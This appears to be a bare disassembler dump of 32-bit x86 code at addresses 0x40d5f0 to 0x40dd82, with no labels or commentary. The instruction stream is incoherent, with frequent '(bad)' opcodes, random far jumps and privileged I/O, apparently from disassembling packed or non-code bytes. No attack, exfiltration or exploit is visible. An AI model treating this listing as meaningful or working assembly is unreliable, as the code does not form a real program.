  40d5f0:	jle    0x40d602
  40d5f2:	cmp    al,0x90
  40d5f4:	push   esp
  40d5f5:	dec    ebx
  40d5f6:	aas    
  40d5f7:	loopne 0x40d644
  40d5f9:	adc    al,0x44
  40d5fb:	lods   eax,DWORD PTR ds:[esi]
  40d5fc:	pop    esp
  40d5fd:	dec    edi
  40d5fe:	hlt    
  40d5ff:	aas    
  40d600:	jle    0x40d5a6
  40d602:	pusha  
  40d603:	(bad)  
  40d604:	push   esp
  40d605:	adc    al,BYTE PTR [edx]
  40d607:	inc    esi
  40d608:	mov    edi,0xfd286aee
  40d60d:	pushf  
  40d60e:	push   0xffffff91
  40d610:	adc    ch,dl
  40d612:	jp     0x40d63b
  40d614:	mov    edi,DWORD PTR [ebx-0x55]
  40d617:	xchg   ebp,eax
  40d618:	add    esi,DWORD PTR [ebx-0x6cabe084]
  40d61e:	rol    BYTE PTR [edi+0x5e],cl
  40d621:	lahf   
  40d622:	(bad)  
  40d623:	out    dx,eax
  40d624:	clc    
  40d625:	(bad)  
  40d626:	aas    
  40d627:	xchg   esi,eax
  40d628:	test   DWORD PTR [ebx+0xfa21d1f],0x2a2563ba
  40d632:	dec    ebp
  40d633:	lahf   
  40d634:	push   0xe761eb3b
  40d639:	nop
  40d63a:	loope  0x40d61d
  40d63c:	div    BYTE PTR [edi]
  40d63e:	mov    ebp,0x4f4f119d
  40d643:	lods   al,BYTE PTR ds:[esi]
  40d644:	sahf   
  40d645:	dec    ecx
  40d646:	cmc    
  40d647:	scas   eax,DWORD PTR es:[edi]
  40d648:	cmc    
  40d649:	imul   edx,DWORD PTR [ebp-0x84e9755],0x51
  40d650:	out    dx,al
  40d651:	fs dec ebx
  40d653:	lahf   
  40d654:	imul   BYTE PTR [esi-0x6c]
  40d657:	sbb    ecx,esi
  40d659:	pop    esp
  40d65a:	add    BYTE PTR [esi+0x56],bl
  40d65d:	inc    ecx
  40d65e:	pop    es
  40d65f:	pusha  
  40d660:	xor    BYTE PTR [ecx-0x6a],ch
  40d663:	inc    ebx
  40d664:	pop    edx
  40d665:	cmp    al,0xed
  40d667:	aas    
  40d668:	call   0x243a:0x24acedb1
  40d66f:	mov    DWORD PTR ss:[bp+si+0xbf3],edi
  40d675:	fdiv   st(5),st
  40d677:	sbb    BYTE PTR [edx],al
  40d679:	mov    edx,DWORD PTR [eax-0x1]
  40d67c:	aaa    
  40d67d:	cld    
  40d67e:	pop    ss
  40d67f:	push   ebp
  40d680:	adc    BYTE PTR [ebx-0x49],bl
  40d683:	sub    eax,0xfc3432e0
  40d688:	push   edx
  40d689:	sbb    eax,0x1d96b34
  40d68e:	pop    ebp
  40d68f:	mov    al,0x9b
  40d691:	hlt    
  40d692:	inc    edi
  40d694:	dec    esp
  40d695:	lods   eax,DWORD PTR ds:[esi]
  40d696:	and    al,0x23
  40d698:	(bad)  
  40d699:	cld    
  40d69a:	fisttp QWORD PTR [edx+0x1d8d4728]
  40d6a0:	push   ss
  40d6a1:	aad    0xc6
  40d6a3:	inc    edi
  40d6a4:	mov    ecx,?
  40d6a6:	sub    dh,BYTE PTR [ebx-0x5098781a]
  40d6ac:	sbb    eax,0x45b96ff6
  40d6b1:	btr    ecx,0xf7
  40d6b5:	dec    ebp
  40d6b6:	out    0x52,ax
  40d6b9:	add    esp,ecx
  40d6bb:	cmp    ah,BYTE PTR [esi+eiz*1+0x29]
  40d6bf:	mov    dl,0xd1
  40d6c1:	(bad)  
  40d6c2:	fcomp  DWORD PTR [ebp-0x2dfbd819]
  40d6c8:	popa   
  40d6c9:	and    edx,ebp
  40d6cb:	dec    edi
  40d6cc:	mov    esi,0x9aa0557b
  40d6d1:	push   esp
  40d6d2:	(bad)  
  40d6d3:	in     eax,dx
  40d6d4:	js     0x40d701
  40d6d6:	fcom   DWORD PTR [edi-0x8cfda4f]
  40d6dc:	frstor [ecx-0x6]
  40d6df:	sub    ch,BYTE PTR [esi-0xc]
  40d6e2:	adc    ebx,DWORD PTR [esi+0x3a]
  40d6e5:	ret    
  40d6e6:	fwait
  40d6e7:	jmp    0x9d4e:0xe66c631a
  40d6ee:	fcmovnu st,st(5)
  40d6f0:	xchg   ebx,eax
  40d6f1:	jae    0x40d70d
  40d6f3:	lds    edi,FWORD PTR [ebx-0x76]
  40d6f6:	mov    ?,WORD PTR [ebx+edi*4-0x63]
  40d6fa:	test   BYTE PTR [ebx+0x3c72d359],dh
  40d700:	repz xor BYTE PTR [ebx-0x45],al
  40d704:	aam    0x70
  40d706:	imul   ecx,DWORD PTR [edx-0x19],0xa469e971
  40d70d:	mov    edi,0xf46a1f9e
  40d712:	scas   eax,DWORD PTR es:[edi]
  40d713:	push   ds
  40d714:	fisttp QWORD PTR [ebx+edx*2]
  40d717:	add    ecx,DWORD PTR [esi-0x49e356]
  40d71d:	call   0x7ab0:0x635a9c2a
  40d724:	mov    dl,0x1e
  40d726:	(bad)  [eax+edi*2-0x627ed347]
  40d72d:	mov    WORD PTR [ecx+0x70],es
  40d730:	cmp    eax,0xbf8baa91
  40d735:	xor    edi,esi
  40d737:	jmp    0xbd31:0xed0b008a
  40d73e:	xchg   edi,eax
  40d73f:	sbb    eax,0x9c95f6af
  40d744:	mov    ch,0xf4
  40d746:	inc    eax
  40d747:	rsqrtps xmm2,XMMWORD PTR [ecx-0x60735ae6]
  40d74e:	sub    eax,DWORD PTR [eax+0x53ee5e0e]
  40d754:	xor    dl,BYTE PTR [ecx]
  40d756:	adc    al,0xe3
  40d758:	inc    esp
  40d759:	outs   dx,BYTE PTR ds:[esi]
  40d75a:	imul   esi,edi,0x42
  40d75d:	loope  0x40d767
  40d75f:	jb     0x40d78a
  40d761:	ror    al,cl
  40d763:	imul   esi,edx,0xffffff8b
  40d766:	and    eax,0xd8063cd4
  40d76b:	add    ecx,ecx
  40d76d:	aaa    
  40d76e:	es enter 0xcbd3,0xa1
  40d773:	mov    fs,ebp
  40d775:	lods   eax,DWORD PTR ds:[esi]
  40d776:	add    eax,0xa4c793ca
  40d77b:	and    al,0x0
  40d77d:	mov    ebx,0x7ce4cb0f
  40d782:	mov    ah,0x1f
  40d784:	push   ecx
  40d785:	sub    BYTE PTR fs:[esp+edi*8],ah
  40d789:	pop    DWORD PTR [ebp-0x7ab28062]
  40d78f:	outs   dx,DWORD PTR ds:[esi]
  40d790:	jns    0x40d782
  40d792:	xchg   edi,esp
  40d794:	lods   eax,DWORD PTR ds:[esi]
  40d795:	and    BYTE PTR [esi-0x3c7152d3],al
  40d79b:	data16 mov gs,WORD PTR [ebx-0x690b11b4]
  40d7a2:	mov    ah,0x4d
  40d7a4:	aaa    
  40d7a5:	mov    BYTE PTR [edi],bl
  40d7a7:	xor    eax,ebx
  40d7a9:	inc    ebx
  40d7aa:	bound  ebx,QWORD PTR [edx-0x5f5c966c]
  40d7b0:	out    0x1b,eax
  40d7b2:	sbb    eax,0xa23259f5
  40d7b7:	pop    ebp
  40d7b8:	shr    BYTE PTR [eax+0x5d31c877],0x62
  40d7bf:	xchg   ebp,eax
  40d7c0:	inc    esp
  40d7c1:	cs (bad) 
  40d7c3:	sub    al,0xee
  40d7c5:	sub    dh,BYTE PTR [esi-0x6d66de26]
  40d7cb:	cmp    eax,0xd15b80a4
  40d7d0:	stos   DWORD PTR es:[edi],eax
  40d7d1:	ss retf 
  40d7d3:	sbb    eax,0x8d2396f2
  40d7d8:	pop    es
  40d7d9:	and    dl,al
  40d7db:	hlt    
  40d7dc:	pop    ebx
  40d7dd:	pop    ebx
  40d7de:	push   0x4ce6e12
  40d7e3:	rcr    DWORD PTR [eax+0x15b9c0f8],cl
  40d7e9:	aad    0x26
  40d7eb:	popf   
  40d7ec:	mov    edi,0x9c678d95
  40d7f1:	sub    eax,0xdd50c204
  40d7f6:	jmp    0xfcb0:0xb824961
  40d7fd:	ret    
  40d7fe:	(bad)  
  40d7ff:	shr    DWORD PTR [ecx-0x74],1
  40d802:	adc    ebp,DWORD PTR [esi-0x4eb2ca97]
  40d808:	mov    WORD PTR [ecx+0x31],?
  40d80b:	or     bh,ch
  40d80d:	cs cmp eax,0x54d603e9
  40d813:	ret    0x770f
  40d816:	push   ss
  40d817:	call   0xb80696f7
  40d81c:	es jmp 0x4e46d5b5
  40d822:	icebp  
  40d823:	ror    DWORD PTR [edx-0x38],cl
  40d826:	xor    cl,BYTE PTR [edx]
  40d828:	add    bh,BYTE PTR ds:0x79efd4a7
  40d82e:	int    0x9e
  40d830:	mov    dh,0x3b
  40d832:	mov    al,ds:0x93317c2
  40d837:	or     dl,BYTE PTR [esi+0x1e86efed]
  40d83d:	xchg   esp,eax
  40d83e:	es or  al,0x55
  40d841:	in     al,dx
  40d842:	addr16 mov ecx,0xdfaf50c4
  40d848:	ins    BYTE PTR es:[edi],dx
  40d849:	aas    
  40d84a:	jmp    0xf8cba74f
  40d84f:	cmp    edi,eax
  40d851:	aas    
  40d852:	fist   WORD PTR [eiz*1-0x31fb9cad]
  40d859:	cmp    al,0x11
  40d85b:	nop
  40d85c:	mov    esi,0xd32ba5b0
  40d861:	sbb    DWORD PTR [eax+0x14],eax
  40d864:	mov    edx,DWORD PTR [edi-0x6182334f]
  40d86a:	xlat   BYTE PTR ds:[ebx]
  40d86b:	shr    BYTE PTR [ebp-0x13],1
  40d86e:	dec    eax
  40d86f:	fcomp  DWORD PTR [ecx-0xded68]
  40d875:	inc    ebp
  40d876:	retf   
  40d877:	into   
  40d878:	ins    BYTE PTR es:[edi],dx
  40d879:	and    eax,0x434fc2f
  40d87e:	xchg   ebp,eax
  40d87f:	and    BYTE PTR [edx],dh
  40d881:	push   cs
  40d882:	(bad)  
  40d883:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d884:	sub    BYTE PTR ds:0x254bd0f2,al
  40d88a:	lock cmp ah,dh
  40d88d:	fild   DWORD PTR [eax]
  40d88f:	lock cdq 
  40d891:	fidiv  WORD PTR [ebx]
  40d893:	xchg   ecx,eax
  40d894:	cmp    BYTE PTR [esi+0x452357ff],bh
  40d89a:	test   eax,0x934cb599
  40d89f:	out    0x84,eax
  40d8a1:	pop    eax
  40d8a2:	daa    
  40d8a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d8a4:	call   0xc125:0xf22eee48
  40d8ab:	push   0xbee21eb
  40d8b0:	pop    ebx
  40d8b1:	data16 arpl WORD PTR [ebx],bp
  40d8b4:	out    dx,al
  40d8b5:	or     bl,BYTE PTR [ebx]
  40d8b7:	fidivr WORD PTR [esi-0x79]
  40d8bb:	mov    ecx,0x3c6e05fc
  40d8c0:	jmp    0x40d93c
  40d8c2:	sub    eax,0x62987ed7
  40d8c7:	int    0x5c
  40d8c9:	loop   0x40d924
  40d8cb:	lods   eax,DWORD PTR ds:[esi]
  40d8cc:	xchg   esi,eax
  40d8cd:	push   ebx
  40d8ce:	cdq    
  40d8cf:	ins    DWORD PTR es:[edi],dx
  40d8d0:	mov    DWORD PTR [ecx+0x7a77dbc7],ebx
  40d8d6:	inc    esi
  40d8d7:	add    edi,DWORD PTR [ecx]
  40d8d9:	in     al,0xfc
  40d8db:	sbb    bh,BYTE PTR [edi]
  40d8dd:	in     al,dx
  40d8de:	adc    DWORD PTR [ebp+0x71],esp
  40d8e1:	jbe    0x40d8a0
  40d8e3:	shr    DWORD PTR [ecx+0x78548691],0x71
  40d8ea:	add    BYTE PTR [edi-0x10],bh
  40d8ed:	js     0x40d949
  40d8ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d8f0:	add    DWORD PTR [ebx],eax
  40d8f2:	sti    
  40d8f3:	dec    eax
  40d8f4:	dec    esp
  40d8f5:	mov    esi,0x6d86a39c
  40d8fa:	aaa    
  40d8fb:	dec    esp
  40d8fc:	or     al,0x6c
  40d8fe:	dec    ebx
  40d8ff:	mov    esi,0xc3ad50aa
  40d904:	les    ecx,FWORD PTR [eax+0x37]
  40d907:	sub    al,0x6d
  40d909:	mov    edi,0xbb1953e9
  40d90e:	ins    DWORD PTR es:[edi],dx
  40d90f:	xor    al,0x3f
  40d911:	push   cs
  40d912:	(bad)  
  40d913:	fst    QWORD PTR [esp+esi*2-0x54]
  40d917:	inc    esp
  40d918:	and    bh,ch
  40d91a:	lahf   
  40d91b:	stc    
  40d91c:	sbb    esi,edi
  40d91e:	mov    bl,0xe0
  40d920:	and    eax,0xf6a15160
  40d925:	mov    eax,ds:0xf6f77291
  40d92a:	add    eax,0xae419959
  40d92f:	jle    0x40d92f
  40d931:	or     DWORD PTR [ebx],ecx
  40d933:	push   0xffffffd2
  40d935:	hlt    
  40d936:	add    al,BYTE PTR [edi+0x78]
  40d939:	mov    ds:0xc8278f31,eax
  40d93e:	xchg   esp,eax
  40d93f:	add    esp,DWORD PTR [ecx-0x5b]
  40d942:	dec    eax
  40d943:	pusha  
  40d944:	loop   0x40d91d
  40d946:	jmp    0x40d976
  40d948:	jecxz  0x40d985
  40d94a:	sub    eax,0x18aa22ba
  40d94f:	inc    ecx
  40d950:	xchg   esi,eax
  40d951:	pop    ebx
  40d952:	imul   ebx,DWORD PTR [bp+di+0x2],0xffffff96
  40d957:	outs   dx,DWORD PTR ds:[esi]
  40d958:	adc    BYTE PTR [ebp-0x1a],0xdf
  40d95c:	cmp    DWORD PTR [esp+ecx*2],ebp
  40d95f:	xchg   ebx,eax
  40d960:	xor    DWORD PTR [ebx+0x782b95f3],0x8839de69
  40d96a:	mov    al,dl
  40d96c:	jne    0x40d92b
  40d96e:	lock aad 0xbb
  40d971:	and    eax,0xb6e9664e
  40d976:	(bad)
  40d97a:	jne    0x40d9cb
  40d97c:	sbb    eax,0x60540774
  40d981:	adc    dl,BYTE PTR [eax+edi*8-0x259e86fc]
  40d988:	(bad)  
  40d989:	sub    edi,DWORD PTR [edx+0xe3ed94f]
  40d98f:	adc    eax,0x8f645803
  40d994:	mov    al,0xda
  40d996:	mov    ds:0x6d0a873a,eax
  40d99b:	push   edi
  40d99c:	fnstsw WORD PTR [ebp+0x50]
  40d99f:	jmp    0x4bcc:0x14106461
  40d9a6:	enter  0xbdd8,0x7a
  40d9aa:	stos   BYTE PTR es:[edi],al
  40d9ab:	push   ebp
  40d9ac:	sbb    eax,0x6038fdcd
  40d9b1:	cdq    
  40d9b2:	push   eax
  40d9b3:	in     al,0x35
  40d9b5:	test   DWORD PTR [edx],esp
  40d9b7:	push   esi
  40d9b8:	cmp    BYTE PTR [edi+0x16],ah
  40d9bb:	aad    0x74
  40d9bd:	add    bl,BYTE PTR [eax-0x70]
  40d9c0:	neg    BYTE PTR [edx-0x5d]
  40d9c3:	jp     0x40d982
  40d9c5:	inc    esi
  40d9c6:	push   ebx
  40d9c7:	dec    ecx
  40d9c8:	outs   dx,DWORD PTR ds:[esi]
  40d9c9:	scas   al,BYTE PTR es:[edi]
  40d9ca:	sbb    eax,0x10635cd3
  40d9cf:	add    ecx,DWORD PTR [esi+0x175e1af9]
  40d9d5:	or     DWORD PTR [esi+edi*4-0x7f],esp
  40d9d9:	(bad)  
  40d9da:	cmp    eax,0x1071dab1
  40d9df:	mov    eax,0xd9eff7cb
  40d9e4:	mov    cs,WORD PTR [ecx]
  40d9e6:	fwait
  40d9e7:	jnp    0x40da25
  40d9e9:	lea    esi,[esi]
  40d9eb:	dec    eax
  40d9ec:	mov    ebp,0xb210a087
  40d9f1:	mov    dh,0x1a
  40d9f3:	xlat   BYTE PTR ds:[ebx]
  40d9f4:	jb     0x40d981
  40d9f6:	jb     0x40da57
  40d9f8:	jmp    0xcb71:0xfc95e33
  40d9ff:	pop    ss
  40da00:	les    ebx,FWORD PTR [edx+0x59]
  40da03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da04:	loope  0x40d9c6
  40da06:	sbb    edi,0x7230fa4f
  40da0c:	call   0x64e76d09
  40da11:	inc    eax
  40da12:	sti    
  40da13:	rol    ecx,1
  40da15:	test   eax,0xe8d0921
  40da1a:	jecxz  0x40da45
  40da1c:	push   es
  40da1d:	dec    esi
  40da1e:	xchg   ebp,eax
  40da1f:	mov    ds:0xe184be2c,al
  40da24:	jnp    0x40d9d9
  40da26:	mov    al,ds:0xba67f788
  40da2b:	test   BYTE PTR [edx-0x6213a479],0x18
  40da32:	xchg   BYTE PTR [edx-0x32cb5408],bl
  40da38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da39:	pushf  
  40da3a:	xor    ah,bh
  40da3c:	shr    DWORD PTR [esi],0x39
  40da3f:	pop    edx
  40da40:	jl     0x40dac0
  40da42:	icebp  
  40da43:	pushf  
  40da44:	dec    eax
  40da45:	jnp    0x40da8f
  40da47:	out    0x9d,al
  40da49:	add    al,0xa8
  40da4b:	(bad)  
  40da4c:	retf   
  40da4d:	cmp    al,0x70
  40da4f:	mov    ecx,0xb1b4c816
  40da54:	loop   0x40dab3
  40da56:	push   cs
  40da57:	cmp    edi,DWORD PTR [eax+ebx*1]
  40da5a:	xor    eax,0xc72b3e7b
  40da5f:	jl     0x40dab8
  40da61:	pusha  
  40da62:	outs   dx,DWORD PTR ds:[esi]
  40da63:	jmp    0x40dabf
  40da65:	rol    DWORD PTR [edi],cl
  40da67:	adc    eax,0x73bb72f7
  40da6c:	rol    BYTE PTR ds:[edi],0xc3
  40da70:	ja     0x40dada
  40da72:	or     eax,0xedcbc0e0
  40da77:	push   ebx
  40da78:	cmp    DWORD PTR [esi+0x109b18a4],edi
  40da7e:	repnz out 0xcc,eax
  40da81:	sub    DWORD PTR [ebx],esi
  40da83:	jns    0x40daa0
  40da85:	je     0x40da12
  40da87:	fwait
  40da88:	std    
  40da89:	lds    edi,FWORD PTR [esi+ebp*2]
  40da8c:	pushf  
  40da8d:	push   eax
  40da8e:	test   eax,0x3e79e56b
  40da93:	fs mov edi,0x566d5c00
  40da99:	dec    edi
  40da9a:	jo     0x40da33
  40da9c:	icebp  
  40da9d:	cld    
  40da9e:	nop
  40da9f:	xlat   BYTE PTR ds:[ebx]
  40daa0:	mov    ds:0xb42f8208,al
  40daa5:	fld    TBYTE PTR [ecx-0x13fa50c0]
  40daab:	jecxz  0x40db24
  40daad:	mov    ah,0x94
  40daaf:	mov    DWORD PTR [ecx-0x461cf317],esi
  40dab5:	hlt    
  40dab6:	rol    BYTE PTR [ebx+0x2c],0x8
  40daba:	dec    ebp
  40dabb:	retf   0x1493
  40dabe:	jmp    0x40db21
  40dac0:	mov    ebp,esp
  40dac2:	pop    ds
  40dac3:	push   ds
  40dac4:	jnp    0x40daa5
  40dac6:	std    
  40dac7:	dec    esp
  40dac8:	or     eax,0xd3e9f256
  40dacd:	iret   
  40dace:	std    
  40dacf:	ret    
  40dad0:	fwait
  40dad1:	out    dx,eax
  40dad2:	mov    ebx,0x2b7062db
  40dad7:	xchg   edi,eax
  40dad8:	xlat   BYTE PTR ds:[ebx]
  40dad9:	mov    ds:0xdf809a01,al
  40dade:	nop
  40dadf:	popa   
  40dae0:	or     BYTE PTR [edi-0x6231dc5],bl
  40dae6:	dec    esi
  40dae7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dae8:	xor    eax,0x329a628a
  40daed:	dec    esi
  40daee:	mov    ebx,0xb34f7c9c
  40daf3:	dec    ebx
  40daf4:	fwait
  40daf5:	or     al,0xd2
  40daf7:	pop    esi
  40daf8:	fs push ebp
  40dafa:	aad    0xf5
  40dafc:	call   0xd3f4:0xc8207698
  40db03:	icebp  
  40db04:	std    
  40db05:	lods   al,BYTE PTR ds:[esi]
  40db06:	lods   al,BYTE PTR ds:[esi]
  40db07:	sub    DWORD PTR [edi+eax*8-0x37],edi
  40db0b:	cs push ds
  40db0d:	pop    ecx
  40db0e:	jge    0x40db14
  40db10:	push   ss
  40db11:	add    eax,0xceb261f8
  40db16:	into   
  40db17:	addr16 jle 0x40db90
  40db1a:	fdivp  st(7),st
  40db1c:	and    DWORD PTR [edi-0x61],ebp
  40db1f:	outs   dx,DWORD PTR ds:[esi]
  40db20:	cmc    
  40db21:	mov    ebx,0x4e9dad08
  40db26:	xchg   ebx,eax
  40db27:	ret    0xb648
  40db2a:	mov    eax,ds:0x794242e
  40db2f:	push   ss
  40db30:	inc    ecx
  40db31:	out    dx,al
  40db32:	xchg   ebp,eax
  40db33:	dec    ecx
  40db34:	jbe    0x40db43
  40db36:	(bad)
  40db3a:	push   esp
  40db3b:	test   DWORD PTR [eax],eax
  40db3d:	out    dx,al
  40db3e:	aam    0x33
  40db40:	inc    edx
  40db41:	into   
  40db42:	push   esp
  40db43:	jle    0x40dadb
  40db45:	int3   
  40db46:	xchg   edi,eax
  40db47:	imul   esi,esi,0x61f11563
  40db4d:	(bad)  
  40db4e:	jecxz  0x40db29
  40db50:	inc    esp
  40db51:	cmp    al,bh
  40db53:	stos   DWORD PTR es:[edi],eax
  40db54:	inc    eax
  40db55:	bound  eax,QWORD PTR [eax]
  40db57:	adc    ah,dh
  40db59:	cmp    ebp,DWORD PTR [esi-0x131cb292]
  40db5f:	pop    esp
  40db60:	aas    
  40db61:	adc    eax,0xa36ad8a8
  40db66:	and    al,0xf3
  40db68:	pusha  
  40db69:	and    edx,DWORD PTR [eax+0x2b]
  40db6c:	into   
  40db6d:	retf   
  40db6e:	outs   dx,DWORD PTR ds:[esi]
  40db6f:	enter  0xba2a,0xc7
  40db73:	leave  
  40db74:	int    0x4f
  40db76:	sub    eax,0x395d8ba0
  40db7b:	mov    edi,esi
  40db7d:	xchg   DWORD PTR ss:[ecx+edi*2+0x1b],ebx
  40db82:	into   
  40db83:	jno    0x40dbcf
  40db85:	in     al,dx
  40db86:	push   0xe8be150
  40db8b:	adc    eax,0xe85a8a35
  40db90:	or     BYTE PTR [edi-0x3a12deac],dl
  40db96:	mov    al,ds:0x11280396
  40db9b:	xchg   DWORD PTR [ebx],esi
  40db9d:	inc    esi
  40db9e:	push   esi
  40db9f:	mov    eax,0xe3c02981
  40dba4:	jno    0x40db2d
  40dba6:	xchg   ecx,eax
  40dba7:	retf   
  40dba8:	jo     0x40db5c
  40dbaa:	push   ebp
  40dbab:	cmp    BYTE PTR [ebx-0x42],ch
  40dbae:	and    ch,0x87
  40dbb1:	or     DWORD PTR [ecx+0x4541ff58],esp
  40dbb7:	adc    esp,eax
  40dbb9:	push   cs
  40dbba:	jns    0x40dbb6
  40dbbc:	add    BYTE PTR [ecx+0x90ce4ba],al
  40dbc2:	sbb    ah,BYTE PTR [ecx+0x55]
  40dbc5:	xchg   BYTE PTR [esi-0x64],dh
  40dbc8:	or     DWORD PTR [ebx-0xf7e9a39],esi
  40dbce:	leave  
  40dbcf:	not    BYTE PTR [esi-0x326c0d04]
  40dbd5:	fs mov ch,0x9e
  40dbd8:	sbb    dh,al
  40dbda:	cli    
  40dbdb:	mov    edi,0x599ab2c0
  40dbe0:	xchg   edx,eax
  40dbe1:	or     al,0x6
  40dbe3:	stos   BYTE PTR es:[edi],al
  40dbe4:	out    dx,al
  40dbe5:	dec    esi
  40dbe6:	mov    ebx,edi
  40dbe8:	add    al,0x88
  40dbea:	mov    WORD PTR [edi],ds
  40dbec:	inc    esp
  40dbed:	ins    DWORD PTR es:[edi],dx
  40dbee:	xor    DWORD PTR [ebx-0x47982240],ebp
  40dbf4:	adc    dh,BYTE PTR [edx]
  40dbf6:	(bad)  
  40dbf7:	lods   al,BYTE PTR ds:[esi]
  40dbf8:	mov    ah,0x4e
  40dbfa:	stc    
  40dbfb:	sub    DWORD PTR [ecx],ebx
  40dbfd:	shl    dl,cl
  40dbff:	cmp    al,0xe7
  40dc01:	fcomp  DWORD PTR [edi-0x51f20576]
  40dc07:	cdq    
  40dc08:	outs   dx,DWORD PTR ds:[esi]
  40dc09:	pop    ecx
  40dc0a:	jl     0x40dc4f
  40dc0c:	jmp    0x8f990c20
  40dc11:	popf   
  40dc12:	mov    esi,0x8a952bd
  40dc17:	inc    ecx
  40dc18:	sbb    al,cl
  40dc1a:	icebp  
  40dc1b:	(bad)  
  40dc1c:	retf   
  40dc1d:	shl    BYTE PTR [ebx+0x6f805824],1
  40dc23:	push   0x8306bec0
  40dc28:	sahf   
  40dc29:	int3   
  40dc2a:	push   ss
  40dc2b:	or     eax,0x531e7fa8
  40dc30:	lds    ecx,FWORD PTR [eax+0x2f]
  40dc33:	add    al,0x9b
  40dc35:	push   edx
  40dc36:	pop    es
  40dc37:	inc    esp
  40dc38:	xor    ebx,DWORD PTR [ecx-0x1cab23cc]
  40dc3e:	aas    
  40dc3f:	mov    BYTE PTR [ebp-0x6f],bh
  40dc42:	pop    ss
  40dc43:	and    esi,esi
  40dc45:	out    dx,eax
  40dc46:	dec    esi
  40dc47:	pop    esi
  40dc48:	inc    ebp
  40dc49:	jl     0x40dbfd
  40dc4b:	lods   eax,DWORD PTR ds:[esi]
  40dc4c:	inc    esp
  40dc4d:	pop    edi
  40dc4e:	in     eax,dx
  40dc4f:	sub    ebp,DWORD PTR [eax+ebp*4]
  40dc52:	xchg   ecx,eax
  40dc53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc54:	add    dl,bl
  40dc56:	jl     0x40dcc3
  40dc58:	aad    0x29
  40dc5a:	int    0xb1
  40dc5c:	leave  
  40dc5d:	pop    esp
  40dc5e:	or     DWORD PTR [ebx-0x714cdf5],0xb758b53a
  40dc68:	outs   dx,DWORD PTR ds:[esi]
  40dc69:	add    ebp,DWORD PTR [edi+esi*1+0x655b6440]
  40dc70:	xor    al,0xcf
  40dc72:	and    eax,0x68619934
  40dc77:	fdivr  DWORD PTR [eax]
  40dc79:	or     eax,0xa608ef19
  40dc7e:	jg     0x40dc75
  40dc80:	jne    0x40dc38
  40dc82:	jg     0x40dc1a
  40dc84:	push   edi
  40dc85:	js     0x40dcfc
  40dc87:	fcom   st(3)
  40dc89:	hlt    
  40dc8a:	or     BYTE PTR [edi-0x76e1723d],cl
  40dc90:	aas    
  40dc91:	push   cs
  40dc92:	jl     0x40dcf3
  40dc94:	cmp    al,0x24
  40dc96:	lock ret 
  40dc98:	sahf   
  40dc99:	mov    eax,ds:0x7fa7fe23
  40dc9e:	iret   
  40dc9f:	jg     0x40dcf8
  40dca1:	and    edi,DWORD PTR [ebp+0x19]
  40dca4:	inc    edx
  40dca5:	std    
  40dca6:	cmp    al,0xca
  40dca8:	or     al,dh
  40dcaa:	dec    eax
  40dcab:	aad    0x5e
  40dcad:	(bad)  
  40dcae:	mov    bl,0x8e
  40dcb0:	and    bh,cl
  40dcb2:	dec    edi
  40dcb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dcb4:	pusha  
  40dcb5:	cmp    ch,dl
  40dcb7:	aas    
  40dcb8:	jo     0x40dd13
  40dcba:	scas   al,BYTE PTR es:[edi]
  40dcbb:	xor    eax,0x6bd4be6a
  40dcc0:	mov    bl,0xfe
  40dcc2:	scas   eax,DWORD PTR es:[edi]
  40dcc3:	loope  0x40dd03
  40dcc5:	pop    es
  40dcc6:	adc    DWORD PTR ds:0xf04bcb53,esi
  40dccc:	mov    bl,0x35
  40dcce:	mov    bl,0x32
  40dcd0:	inc    ebp
  40dcd1:	fdivr  QWORD PTR [ecx-0x6a59ed48]
  40dcd7:	cmpxchg BYTE PTR [edi-0x41984d41],cl
  40dcde:	xor    DWORD PTR [ebx],edi
  40dce0:	add    DWORD PTR [ebx-0x20],0x61
  40dce4:	aas    
  40dce5:	xor    ebp,DWORD PTR [ebp+0x4b67aa14]
  40dceb:	mov    eax,0xa9405afb
  40dcf0:	fwait
  40dcf1:	jo     0x40dcc9
  40dcf3:	sbb    al,0x65
  40dcf5:	scas   eax,DWORD PTR es:[edi]
  40dcf6:	pop    ebx
  40dcf7:	sahf   
  40dcf8:	push   ebx
  40dcf9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dcfa:	mov    dl,0x92
  40dcfc:	sbb    dh,BYTE PTR ds:0x81f9c4bf
  40dd02:	shl    DWORD PTR [edi+0x4a],0x79
  40dd06:	rol    DWORD PTR [edi],1
  40dd08:	adc    eax,0xfa52d964
  40dd0d:	add    eax,0xefc48513
  40dd12:	(bad)  
  40dd13:	aad    0x1e
  40dd15:	clc    
  40dd16:	test   eax,0x6b057a68
  40dd1b:	push   ebx
  40dd1c:	push   ebx
  40dd1d:	mov    ecx,0x43b70488
  40dd22:	jge    0x40dca4
  40dd24:	xor    al,0x58
  40dd26:	mov    bl,0x69
  40dd28:	mov    cs,WORD PTR [ecx+ebx*8]
  40dd2b:	sbb    al,bh
  40dd2d:	sub    BYTE PTR [edx],dl
  40dd2f:	mov    WORD PTR [ecx-0x78ef9dc4],?
  40dd35:	jg     0x40dd0c
  40dd37:	mov    al,0xfa
  40dd39:	data16 jmp 0x40dcf1
  40dd3c:	mov    ebp,0x3f91214c
  40dd41:	(bad)  
  40dd42:	div    DWORD PTR [ebp-0x38f2c9fc]
  40dd48:	or     eax,DWORD PTR [eax+ecx*2-0x7]
  40dd4c:	cmp    eax,0xf1840975
  40dd51:	pop    ss
  40dd52:	ins    BYTE PTR es:[edi],dx
  40dd53:	test   DWORD PTR [edx],esi
  40dd55:	mov    ch,0xd7
  40dd57:	(bad)  
  40dd59:	cmp    DWORD PTR [ebx],esi
  40dd5b:	cmp    al,0xd
  40dd5d:	push   eax
  40dd5e:	mov    BYTE PTR [esi+0x3b123af4],bh
  40dd64:	loope  0x40dde2
  40dd66:	div    DWORD PTR [ebx+edx*4+0x2ff28f78]
  40dd6d:	fnstsw WORD PTR [eax-0x54c12aac]
  40dd73:	lods   al,BYTE PTR ds:[esi]
  40dd74:	adc    ah,dl
  40dd76:	mov    esp,0x3188c3dc
  40dd7b:	push   ecx
  40dd7c:	mov    ds:0xa1b3c38a,eax
  40dd81:	cli    
  40dd82:	cli    
